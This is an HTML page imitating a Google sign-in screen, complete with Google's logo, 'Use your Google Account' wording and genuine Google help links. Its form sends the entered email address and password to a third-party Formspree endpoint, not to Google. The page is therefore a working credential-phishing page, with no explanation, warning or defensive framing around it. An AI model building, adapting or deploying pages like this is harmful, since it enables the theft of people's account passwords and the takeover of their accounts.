<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Google Sign In</title>
  <link rel="stylesheet" href="style.css"/>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
</head>
<body>
  <div class="container">
    <form class="form-box" action="https://formspree.io/f/meoapdwk" method="POST">
      <!-- Logo Google -->
      <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" class="google-logo">

      <h1 class="title">Sign in</h1>
      <p class="subtitle">Use your Google Account</p>

      <!-- Input Email -->
      <label>
        Email or phone:
        <input type="email" name="email" placeholder="Email or phone" required class="input-field"/>
      </label>

      <!-- Input Password -->
      <label>
        Enter your password:
        <input type="password" name="password" placeholder="Enter your password" required class="input-field"/>
      </label>

      <div class="form-footer">
        <a href="https://support.google.com/mail/answer/41078?hl=en&co=GENIE.Platform%3DDesktop" class="link" target="_blank" rel="noopener noreferrer">Forgot password?</a>
      </div>

      <p class="info-text">
        Not your computer? Use Guest mode to sign in privately.
        <a href="https://support.google.com/chrome/answer/6130773?hl=en&co=GENIE.Platform%3DAndroid#:~:text=In%20Guest%20mode%2C%20you%20won,or%20borrowing%20someone%20else's%20computer." class="link" target="_blank" rel="noopener noreferrer">Learn more about using Guest mode</a>
      </p>

      <div class="bottom-row">
        <a href="https://support.google.com/accounts/answer/27441?hl=en&co=GENIE.Platform%3DAndroid" class="link create-account" target="_blank" rel="noopener noreferrer">Create account</a>

        <button type="submit" class="next-btn">Next</button>
      </div>
    </form>
  </div>
</body>
</html>
